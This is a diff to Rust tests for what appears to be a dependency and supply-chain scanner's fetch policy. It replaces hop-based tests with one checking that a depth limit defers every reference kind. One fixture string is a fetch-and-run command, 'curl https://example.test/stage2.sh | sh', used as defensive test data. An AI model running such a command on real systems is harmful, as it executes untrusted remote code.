@@ -539,28 +539,6 @@ fn follow_name_round_trips_through_parse_follow() {
     );
 }
 
-#[test]
-fn declared_deps_stop_at_the_first_hop_unless_transitive() {
-    // Hop 0 is the artifact's own declared supply chain and is always
-    // followed. Past it, declared dependencies are the transitive tail —
-    // a registry lookup each, almost all of it aged out — so an interactive
-    // policy drops them while the dropper kinds keep going.
-    let mut policy: FetchPolicy = "all".parse().unwrap();
-    assert!(!policy.transitive_deps, "interactive default");
-    assert!(policy.wants_at(RefKind::Dependency, 0));
-    assert!(!policy.wants_at(RefKind::Dependency, 1));
-    for hop in 0..3 {
-        assert!(policy.wants_at(RefKind::UrlFetch, hop), "hop {hop}");
-        assert!(policy.wants_at(RefKind::Command, hop), "hop {hop}");
-    }
-    // A corpus-facing role takes the whole closure.
-    policy.transitive_deps = true;
-    assert!(policy.wants_at(RefKind::Dependency, 3));
-    // The hop rule never *adds* a kind the selection left out.
-    let refs: FetchPolicy = "references".parse().unwrap();
-    assert!(!refs.wants_at(RefKind::Dependency, 0));
-}
-
 /// The package references discovery reports for `source`, a file named `path`.
 fn discovered(path: &str, file_type: &str, source: &[u8]) -> Vec<Reference> {
     let parsed = filefacts::OpenOptions::new()
@@ -763,48 +741,63 @@ fn imported_packages_meet_the_known_good_check_at_their_resolved_version() {
 }
 
 #[test]
-fn imported_packages_stop_at_the_first_hop_like_declared_ones() {
-    // A fetched dependency's own imports are the transitive tail a declared
-    // dependency's dependencies are: followed from the scanned artifact,
-    // and past it only by a policy that takes the whole closure.
-    let mut policy: FetchPolicy = "all".parse().unwrap();
-    assert!(!policy.transitive_deps, "interactive default");
-    let imports: Vec<Reference> = import_forms("alphapkg", "betapkg")
+fn the_depth_limit_cuts_every_kind_of_reference_alike() {
+    // Declared dependencies, imported packages, install commands and URLs
+    // past the configured depth are deferred by one limit: no kind is held
+    // to a stricter or a looser one. A depth that admits no level at all
+    // shows it for every kind at once.
+    let mut refs: Vec<Reference> = import_forms("alphapkg", "betapkg")
         .into_iter()
         .flat_map(|(path, file_type, _, source)| discovered(path, file_type, source.as_bytes()))
         .collect();
-    assert_eq!(imports.len(), 6, "{imports:?}");
-    for import in &imports {
+    assert_eq!(refs.len(), 6, "{refs:?}");
+    refs.extend([
+        Reference::new(
+            RefLocator::Purl("pkg:pypi/gammapkg".into()),
+            RefKind::Dependency,
+            "requirements",
+            "gammapkg",
+        ),
+        Reference::new(
+            RefLocator::Purl("pkg:pypi/deltapkg".into()),
+            RefKind::Command,
+            "shell",
+            "pip install deltapkg",
+        ),
+        Reference::new(
+            RefLocator::Url("https://example.test/stage2.sh".into()),
+            RefKind::UrlFetch,
+            "shell",
+            "curl https://example.test/stage2.sh | sh",
+        ),
+    ]);
+    let mut policy = FetchPolicy::parse_follow("all").unwrap();
+    policy.depth = 0;
+    let mut report: AnalysisReport =
+        serde_json::from_value(serde_json::json!({"version":"3","files":[
+            {"id":0,"path":"app.py","depth":0,"file_type":"python","sha256":"a".repeat(64),"size":1}
+        ]}))
+        .unwrap();
+    static RESOURCES: std::sync::OnceLock<Resources> = std::sync::OnceLock::new();
+    let resources = RESOURCES.get_or_init(|| Resources {
+        net: Box::new(super::offline::Offline),
+        cache: super::offline::cache(),
+    });
+    let worklist = vec![("a".repeat(64), refs.clone())];
+    let mut session = FetchSession::new(&report, &worklist, resources, Follow::quiet(policy), None);
+    session.run(&mut report, worklist);
+
+    assert_eq!(session.out.records.len(), refs.len());
+    for record in &session.out.records {
         assert!(
-            policy.follows_at(import, 0),
-            "{} at the artifact",
-            import.source
-        );
-        assert!(!policy.follows_at(import, 1), "{} past it", import.source);
-        let mut declared = import.clone();
-        declared.kind = RefKind::Dependency;
-        assert_eq!(
-            policy.follows_at(import, 1),
-            policy.follows_at(&declared, 1),
-            "an import and a declaration of {} are followed alike",
-            locator(import)
-        );
-    }
-    // A package an install command names is a dropper step, followed at
-    // every hop.
-    let installed = Reference::new(
-        RefLocator::Purl("pkg:pypi/alphapkg".into()),
-        RefKind::Command,
-        "shell",
-        "pip install alphapkg",
-    );
-    assert!(policy.follows_at(&installed, 1));
-    policy.transitive_deps = true;
-    for import in &imports {
-        assert!(
-            policy.follows_at(import, 3),
-            "{} in the closure",
-            import.source
+            record.coverage.iter().any(|fact| matches!(
+                fact,
+                Coverage::Pending { reason, hop: 0 } if reason == "depth limit"
+            )),
+            "{} ({:?}) is cut by the depth limit: {:?}",
+            record.locator,
+            record.kind,
+            record.coverage
         );
     }
 }
